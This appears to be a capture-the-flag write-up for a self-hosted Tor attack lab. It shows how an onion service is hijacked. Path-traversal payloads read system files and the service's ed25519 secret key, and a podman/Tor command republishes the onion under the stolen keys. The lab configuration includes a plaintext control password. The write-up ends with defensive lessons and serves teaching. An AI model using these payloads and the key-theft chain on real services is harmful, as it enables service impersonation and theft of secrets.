---
title: "GOTOR : Onion Takeover - Hijacking an Onion Service with Leaked Keys"
date: 2026-10-29
categories: [CTF, GOTOR]
tags: [tor, onion-service, lfi, key-theft, takeover, writeup]
media_subpath: /assets/img/
---

## GOTOR

> This is a writeup for one of the attacks in **GOTOR**, a self-hosted lab for practising attacks against Tor. The lab is available [on GitHub](https://github.com/NiBi8z/GOTOR).
{: .prompt-tip }

![The challenge setup](tokeoversetup.png)

For this challenge, we have to take over an onion address. In other words, we want clients reaching this onion to be redirected to **our** server instead of the real one.

Let's see whether that is possible.

## How the attack works

In a connection to a `.onion`, there is no DNS, no URL → IP mapping. That is by design: the whole point of a `.onion` is to never leak the server's IP.

Instead, every day (every 24 minutes in GOTOR), a set of relays is picked to store the **descriptors** of onion services. Those relays are ordinary Tor relays , their IPs are public, because they appear in the consensus. The set rotates constantly so that no relay can predict, far in advance, which services it will be responsible for (this is exactly the unpredictability we abused in the [HSDir preshot writeup](/posts/gotor-hsdir-preshot/)).

A descriptor contains the service's **introduction points**. These are Tor relays with which the `.onion` keeps permanent connections open. The flow is roughly:

1. The client fetches the descriptor and reads the list of introduction points.
2. The client contacts one of them: *"Hey, tell this `.onion` to meet me at this rendezvous point."*
3. The service and the client both connect to the rendezvous point, where a key exchange takes place so they can communicate securely.

The crucial detail: **the descriptor is signed with the onion's private key**, and a `.onion` address is in fact its *public key*. That is what lets a client verify that a descriptor really was published by that specific service.

So if we can **steal the private key** of the `.onion`, we can sign and publish our own descriptor , one that points at introduction points **we** control. From that moment on, the real `.onion` is no longer told when a client wants to connect: **we are**. We have hijacked the service.

All we need is the key. Enter the web application.

## The web application

The website has a very basic vulnerability.

```bash
➜  GOTOR git:(main) ✗ curl --socks5-hostname 127.0.0.1:9050 http://bhmjyoznk4hqritfefuheb5yb3z5djb5kj5uwlckml6l2ufk7gh6clqd.onion
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page?f=home.html">/page?f=home.html</a>. If not, click the link.
```

Pages are loaded through `?f=home.html`. Trying standard LFI payloads, `?f=../../../../etc/passwd` gives us:

```bash
➜  GOTOR git:(main) ✗ curl --socks5-hostname 127.0.0.1:9050 http://bhmjyoznk4hqritfefuheb5yb3z5djb5kj5uwlckml6l2ufk7gh6clqd.onion/page\?f\=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
debian-tor:x:100:101::/var/lib/tor:/bin/false
➜  GOTOR git:(main) ✗
```

So we can read arbitrary files on the server.

Enumerating what is running on the machine, we look at PID 1:

```bash
➜  GOTOR git:(main) ✗ curl  --socks5-hostname 127.0.0.1:9050 http://bhmjyoznk4hqritfefuheb5yb3z5djb5kj5uwlckml6l2ufk7gh6clqd.onion/page\?f\=../../../../proc/1/cmdline --output -
tor-f/tmp/torrc%
```

I add `--output -` to print the raw, non-ASCII content in the terminal (`/proc/1/cmdline` separates arguments with NUL bytes, so `tor -f /tmp/torrc` comes out glued together as `tor-f/tmp/torrc`).

PID 1 is therefore `tor` (no surprise there) and its configuration file lives at `/tmp/torrc`.

```bash
➜  GOTOR git:(main) ✗ curl  --socks5-hostname 127.0.0.1:9050 http://bhmjyoznk4hqritfefuheb5yb3z5djb5kj5uwlckml6l2ufk7gh6clqd.onion/page\?f\=../../../../tmp/torrc --output -
# ============================================================================
# common.torrc 
# ============================================================================


TestingTorNetwork 1

# Relays ALWAYS get the flag Running.
AssumeReachable 1

# Build circuit even with a few relay.
PathsNeededToBuildCircuits 0.25

# HSDir given to anybody 
TestingDirAuthVoteHSDir *

TestingDirAuthVoteGuard guard1,guard2,guard3
TestingDirAuthVoteGuardIsStrict 1

# Give ControlPort access for debug purpose
ControlPort 0.0.0.0:9051
CookieAuthentication 1
CookieAuthFileGroupReadable 1

# password : "goadtor-dashboard-lab" 
HashedControlPassword 16:C6248AC18BDFF0CB6027EE2D2AD64CE84DD9E3D9329160DF7463EB8B2E

Log notice stdout

ORPort 0
SocksPort 0
Nickname hs3
DataDirectory /var/lib/tor-hs
Address 10.44.4.219
HiddenServiceDir /var/lib/tor-hs/hs
HiddenServicePort 80 127.0.0.1:8080
# Fix guard
EntryNodes guard1,guard2,guard3
StrictNodes 1
UseEntryGuards 1

DirAuthority auth1 orport=9001 v3ident=A0FDFBCC74E54922F3CAE99720B11BB0F0037F09 10.44.0.11:9030 B8686EA54C95C9E05BA890B0B7018B7247503A38
DirAuthority auth2 orport=9001 v3ident=A7F53590573C912ABDC53FC9B9B20213E945F464 10.44.0.12:9030 0947F45CADBF7E504D7B89906F15C0B37C0A437C
DirAuthority auth3 orport=9001 v3ident=7F606B1C1A01D93874A09744263E5F0C56547DF8 10.44.0.13:9030 2516978BCCE81E46203411FB282475D0ED95CD39
```

The Tor configuration tells us a lot. In particular, we see the `HiddenServiceDir` parameter. This is the directory where the keys for this onion are stored , including **the private key that signs the descriptors**.

Searching online, spinning up a test `.onion`, or just reading Tor's source (`src/feature/hs/hs_service.c`) tells us how those files are named:

```c
static const char fname_keyfile_prefix[] = "hs_ed25519";
........
  tor_snprintf(fname, sizeof(fname), "%s_secret_key", fname_keyfile_prefix);
  smartlist_add(list, hs_path_from_filename(s_dir, fname));
  tor_snprintf(fname, sizeof(fname), "%s_public_key", fname_keyfile_prefix);
  smartlist_add(list, hs_path_from_filename(s_dir, fname));
```

So the public key is `hs_ed25519_public_key` and the private key is `hs_ed25519_secret_key`. The same directory also holds a `hostname` file, which simply contains the onion's URL , we can grab that too.

Let's pull all three:

```bash
➜  GOTOR git:(main) ✗ curl --socks5-hostname 127.0.0.1:9050 http://$ONION/page\?f\=../../../../../var/lib/tor-hs/hs/hs_ed25519_public_key --output /tmp/keys/hs_ed25519_public_key
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     64 100     64   0      0   3392      0                              0

➜  GOTOR git:(main) ✗ curl --socks5-hostname 127.0.0.1:9050 http://$ONION/page\?f\=../../../../../var/lib/tor-hs/hs/hs_ed25519_secret_key --output /tmp/keys/hs_ed25519_secret_key
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     96 100     96   0      0   5616      0                              0

➜  GOTOR git:(main) ✗ curl --socks5-hostname 127.0.0.1:9050 http://$ONION/page\?f\=../../../../../var/lib/tor-hs/hs/hostname --output /tmp/keys/hostname
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     63 100     63   0      0   3287      0                              0
```

We now have everything we need to run a `.onion` under those keys.

## Standing up our own onion

There are plenty of tutorials on how to set up a `.onion`. The lab already ships a podman image with `python3` and `tor` installed, and , importantly , pre-configured for the lab (directory authorities, etc.). I'll start from that.

That image uses `scripts/entrypoint.sh` as its entrypoint to automatically set up clients and relays. We **don't** want the lab's automatic setup, so we override the entrypoint with `--entrypoint sh` and pass the full list of commands to run before launching our Tor. It makes for a (slightly) long command.

We take the essentials from the lab's `torrc/common.torrc` to match the lab's authorities and keep some debug tooling:

```bash
# ============================================================================
# common.torrc 
# ============================================================================


TestingTorNetwork 1

# Relays ALWAYS get the flag Running.
AssumeReachable 1

# Build circuit even with a few relay.
PathsNeededToBuildCircuits 0.25

# HSDir given to anybody 
TestingDirAuthVoteHSDir *

TestingDirAuthVoteGuard guard1,guard2,guard3
TestingDirAuthVoteGuardIsStrict 1

# Give ControlPort access for debug purpose
ControlPort 0.0.0.0:9051
CookieAuthentication 1
CookieAuthFileGroupReadable 1

HashedControlPassword 16:C6248AC18BDFF0CB6027EE2D2AD64CE84DD9E3D9329160DF7463EB8B2E

Log notice stdout
```

To host a hidden service, we specify the path of the site on the filesystem with `HiddenServiceDir`, where it listens locally with `HiddenServicePort`, and we use `DataDirectory` to point Tor at our keys.

So we create the directories for our site and for the keys , being careful to use restrictive permissions, otherwise Tor refuses to load the keys , then append the lab's own directory authorities (they are generated automatically and placed in the container at `/shared/dirauth.inc`).

Finally we start our web server (a basic Python server in our case) and Tor with our configuration:

```bash
podman run -d --name OnionTakeOver --network gotor \
  -v gotor_shared:/shared -v /tmp/keys:/keys:ro \
  --entrypoint sh gotor/node:latest -c '
    set -e
    mkdir -p /var/lib/evilhs/hs /srv/pwn
    cp /keys/hs_ed25519_secret_key /keys/hs_ed25519_public_key /keys/hostname /var/lib/evilhs/hs/
    chmod 700 /var/lib/evilhs /var/lib/evilhs/hs; chmod 600 /var/lib/evilhs/hs/*
    printf "PWN BY nibi\n" > /srv/pwn/index.html
    { cat <<EOF
TestingTorNetwork 1
AssumeReachable 1
PathsNeededToBuildCircuits 0.25
ORPort 0
SocksPort 0
ControlPort 0
DataDirectory /var/lib/evilhs
HiddenServiceDir /var/lib/evilhs/hs
HiddenServicePort 80 127.0.0.1:80
EntryNodes guard1,guard2,guard3
StrictNodes 1
UseEntryGuards 1
Log notice stdout
EOF
      cat /shared/dirauth.inc; } > /tmp/torrc
    (cd /srv/pwn && python3 -m http.server 80 --bind 127.0.0.1 >/dev/null 2>&1) &
    exec tor -f /tmp/torrc'
```

Now we just wait a few moments for our `OnionTakeOver` to publish its descriptor:

```bash
podman logs OnionTakeOver | grep -iE "Bootstrapped 100|uploaded|descriptor|intro|rendezvous" | tail

Nov 02 18:19:18.000 [notice] Bootstrapped 45% (requesting_descriptors): Asking for relay descriptors
Nov 02 18:19:18.000 [notice] I learned some more directory information, but not enough to build a circuit: We need more microdescriptors: we have 0/11, and can only build 0% of likely paths. (We have 0% of guards bw, 0% of midpoint bw, and 0% of end bw (no exits in consensus, using mid) = 0% of path bw.)
Nov 02 18:19:18.000 [notice] Bootstrapped 50% (loading_descriptors): Loading relay descriptors
Nov 02 18:19:19.000 [notice] Bootstrapped 100% (done): Done
```

Looking good. Let's test from a client, say `client2`:

```bash
➜  GOTOR git:(main) ✗ podman exec -it client2 'bash' -c "curl --socks5-hostname 127.0.0.1:9050 http://jzf664gl5lamjheuluqf5xa3bltrvni64hwurf4fcg6fjsvhl2lrjqid.onion/"
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page?f=home.html">/page?f=home.html</a>. If not, click the link.
➜  GOTOR git:(main) ✗
```

IT DIDN'T WORK????

Actually, it did. By default, Tor caches onion descriptors. I had already made a request to this `.onion` from `client2`, and for performance reasons my Tor process will keep using the cached descriptor for up to **3 hours** before fetching a fresh one. (This isn't an arbitrary number: a v3 descriptor carries a `descriptor-lifetime` field, whose default , `HS_DESC_DEFAULT_LIFETIME` in `src/feature/hs/hs_descriptor.h` , is exactly `3 * 60 * 60` seconds, and the client honours it.)

There is no dedicated option to disable onion-descriptor caching. But, as suggested [here](https://tor.stackexchange.com/questions/16126/how-do-i-tell-tor-to-not-cache-onion-descriptors), we can ask Tor to build a **new identity** by sending the `NEWNYM` signal. A new identity tells Tor to build fresh circuits for upcoming connections and stop reusing the old ones , and, as a side effect, to drop the caches it has accumulated, including the hidden-service descriptor cache. (In Tor's source, `NEWNYM` runs `signewnym_impl()`, which calls `hs_client_purge_state()` , precisely the function that wipes the client descriptor cache.)

The `NEWNYM` signal is sent over the `ControlPort`. It can be sent in [several ways](https://techearl.com/tor-new-circuit-newnym-control-port); we'll do it in Python with the `stem` library:

```bash
➜  GOTOR git:(main) ✗ podman exec -it client2 'python3' -c "from stem import Signal
from stem.control import Controller                            

with Controller.from_port(port=9051) as controller:
    controller.authenticate()
    controller.signal(Signal.NEWNYM)
    "
```

And now:

```bash
➜  GOTOR git:(main) ✗ podman exec -it client2 'bash' -c "curl --socks5-hostname 127.0.0.1:9050 http://jzf664gl5lamjheuluqf5xa3bltrvni64hwurf4fcg6fjsvhl2lrjqid.onion/"
PWN BY nibi
➜  GOTOR git:(main) ✗
```

TADA! The client now reaches **our** server instead of the real one.

![Challenge solved](takeoversolved.png)

## Conclusion

A web vulnerability that would be rated "medium" on the clear web , an arbitrary file read , becomes **critical** on a hidden service, because what it exposes is not just data: it is the service's identity itself.

On a normal website, leaking a secret is bad but recoverable: you rotate the credential, revoke the token, reissue the certificate, and the domain name stays yours. A v3 onion is different. **The address *is* the public key, and the `hs_ed25519_secret_key` *is* the identity.** There is no authority to revoke it, no DNS registrar to appeal to, no way to tell clients "that key is no longer me". Once the secret key leaks, the attacker can sign valid descriptors forever and transparently impersonate the service , and the only real remedy is to abandon the onion address entirely and publish a brand-new one, which breaks every bookmark, link, and reference that ever pointed at the old address. For a service whose whole value is a hard-to-guess address people have learned to trust, that is close to catastrophic.

Worth noting too: unlike the HSDir preshot attack, **nothing here depended on the lab's accelerated settings**. The fast flags and `TestingDirAuthVoteHSDir *` did not help us; the only thing that mattered was reading a file. This exact chain , LFI → read `HiddenServiceDir` → republish , works identically against a real-world hidden service.

So the defensive lessons are blunt but important:

- **Isolate the web application from the Tor process.** The web server should never be able to read Tor's `DataDirectory` / `HiddenServiceDir`. Run them as different users, in different containers, with the key directory owned by `debian-tor`, mode `700`, and unreadable by `www-data`. Here they shared a filesystem, and that was the whole game.
- **Never let user input select a filesystem path.** Serve pages from a fixed whitelist or an opaque identifier, canonicalise and confine any path, and sandbox the web app (chroot, seccomp, read-only mounts) so even a traversal bug reaches nothing valuable.
- **Treat onion keys as unrecoverable secrets.** You cannot rotate them without changing your address, so prevention is the entire defence. Consider v3 client authorization for sensitive services, and keep offline backups of the keys so that, if you *are* ever forced to migrate, you do it on your own terms.

On Tor, "read any file" and "become the service" are much closer together than operators tend to assume.
